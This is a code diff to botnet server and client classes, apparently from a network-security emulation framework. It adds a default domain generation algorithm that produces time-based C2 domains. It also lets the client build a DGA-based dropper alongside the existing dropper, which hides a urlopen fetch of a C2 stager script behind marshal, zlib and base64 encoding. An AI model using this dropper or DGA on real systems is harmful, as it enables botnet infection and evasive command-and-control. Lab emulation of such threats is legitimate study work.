@@ -48,6 +48,30 @@ while True:
 
 """
 
+DGA_DEFAULT_FUNCTION = """
+def dga() -> list:
+    #Generate 10 domains for the given time.
+    domain_list = []
+    domain = ""
+    import math, datetime
+    today = datetime.datetime.utcnow()
+    year = today.year
+    month = today.month
+    minute = today.minute
+    minute = int(math.ceil(minute/5))*5
+
+    for i in range(16):
+        year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17)
+        month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8)
+        minute = ((minute ^ (minute << 13)) >> 19) ^ ((minute & 0xFFFFFFFE) << 12)
+        domain += chr(((year ^ month ^ minute) % 25) + 97)
+        if i > 6:
+            domain_list.append(domain+ ".com")
+
+    return domain_list
+"""
+
+
 class BotnetServer(Server):
     """!
     @brief The BotnetServer class.
@@ -113,7 +137,7 @@ class BotnetClientServer(Server):
         ## ! todo, not support to change port right now
         self.__port = port
 
-    def setServer(self, c2_server: str, dga = None):
+    def setServer(self, c2_server: str, enable_dga = False, dga = None):
         """!
         @brief BotnetClient constructor.
 
@@ -124,12 +148,15 @@ class BotnetClientServer(Server):
         self.__c2_server_url = 'http://{}:446//stagers/b6H.py'.format(c2_server)
         self.__c2_server_ip = c2_server
 
-        if dga is None:
+        if not enable_dga:
             self.__dropper = BotnetServerFileTemplates['dropper']\
                         .format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()"
                                                                       .format(repr(self.__c2_server_url)),2)))))
         else:
-            dga_source_code = inspect.getsource(dga)
+            if dga is None:
+                dga_source_code = DGA_DEFAULT_FUNCTION
+            else:
+                dga_source_code = inspect.getsource(dga)
             self.__dropper = BotnetServerFileTemplates['dga_dropper'].format(dga = dga_source_code)
 
     def install(self, node: Node):
